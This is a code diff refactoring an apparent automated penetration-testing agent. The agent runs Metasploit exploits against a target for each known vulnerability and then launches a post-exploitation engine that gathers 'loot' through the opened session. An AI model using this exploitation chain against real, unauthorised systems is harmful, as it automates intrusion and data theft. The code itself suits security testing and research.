@@ -649,6 +649,38 @@ def suggest_exploit_for_vuln(vuln_type: str) -> str | None:
 
 
 # State integration
+async def _run_post_exploitation(
+    msf: MetasploitRPC,
+    session: MSFSession,
+) -> None:
+    """Run post-exploitation on a successful session."""
+    try:
+        from modules.post_exploit import C2ShellWrapper, PostExploitEngine
+
+        logger.info("Starting Post-Exploitation Phase...")
+
+        class MSFShellAdapter(C2ShellWrapper):
+            """Adapter to use MSF session as a shell interface."""
+
+            def __init__(self, msf_client: MetasploitRPC, session_id: int) -> None:
+                self.msf = msf_client
+                self.sid = session_id
+
+            async def execute(self, cmd: str) -> str:
+                await self.msf.session_shell_write(self.sid, cmd)
+                return await self.msf.session_shell_read(self.sid)
+
+        adapter = MSFShellAdapter(msf, session.session_id)
+        os_type = "linux" if "linux" in str(session.info).lower() else "windows"
+
+        engine = PostExploitEngine(adapter, os_type)
+        loot = await engine.run()
+        logger.info("Post-Exploitation Loot: %s items found", len(loot))
+
+    except Exception as e:
+        logger.exception("Post-Exploitation failed: %s", e)
+
+
 async def auto_exploit(
     state: "AgentState",
     msf: MetasploitRPC,
@@ -667,76 +699,33 @@ async def auto_exploit(
         List of ExploitResult objects
 
     """
-    results = []
+    results: list[ExploitResult] = []
 
     if not state.target:
         logger.warning("Target must be set in state for auto_exploit")
         return results
+
     for vuln in state.vulnerabilities:
         exploit = suggest_exploit_for_vuln(vuln.vuln_id)
+        if not exploit:
+            continue
 
-        if exploit:
-            logger.info("Attempting {exploit} for %s", vuln.vuln_id)
+        logger.info("Attempting {exploit} for %s", vuln.vuln_id)
 
-            result = await msf.run_exploit(
-                exploit_name=exploit,
-                target_host=state.target,
-                lhost=lhost,
-                lport=lport,
-            )
+        result = await msf.run_exploit(
+            exploit_name=exploit,
+            target_host=state.target,
+            lhost=lhost,
+            lport=lport,
+        )
+        results.append(result)
 
-            results.append(result)
+        if result.status == ExploitStatus.SUCCESS:
+            state.set_foothold(exploit)
+            if result.session:
+                await _run_post_exploitation(msf, result.session)
+            break
 
-            # Update state if successful
-            if result.status == ExploitStatus.SUCCESS:
-                state.set_foothold(exploit)
-
-                # --- Post Exploitation Integration ---
-                try:
-                    from modules.post_exploit import C2ShellWrapper, PostExploitEngine
-
-                    if result.session:
-                        logger.info("Starting Post-Exploitation Phase...")
-
-                        # Create a wrapper for the MSF session to act as a shell
-                        # We need to adapt the MSF session to ShellInterface
-                        class MSFShellAdapter(C2ShellWrapper):
-                            """Auto-generated docstring for MSFShellAdapter class."""
-
-                            def __init__(self, msf_client, session_id) -> None:
-                                self.msf = msf_client
-                                self.sid = session_id
-
-                            async def execute(self, cmd: str) -> str:
-                                # Determine session type and use appropriate write/read
-                                # Simplify: assume shell for now or implement meterpreter specific
-                                return await self.msf.session_shell_write(
-                                    self.sid,
-                                    cmd,
-                                ) and await self.msf.session_shell_read(self.sid)
-
-                        adapter = MSFShellAdapter(msf, result.session.session_id)
-
-                        # Detect OS rudimentary way or use session info
-                        os_type = (
-                            "linux"
-                            if "linux" in str(result.session.info).lower()
-                            else "windows"
-                        )
-
-                        engine = PostExploitEngine(adapter, os_type)
-                        loot = await engine.run()
-
-                        logger.info("Post-Exploitation Loot: %s items found", len(loot))
-                        # Store loot in state (if we extend state to hold loot)
-                        # state.add_loot(loot)
-
-                except Exception as e:
-                    logger.exception("Post-Exploitation failed: %s", e)
-                # -------------------------------------
-
-                break
-
-            lport += 1  # Increment port for next attempt
+        lport += 1
 
     return results
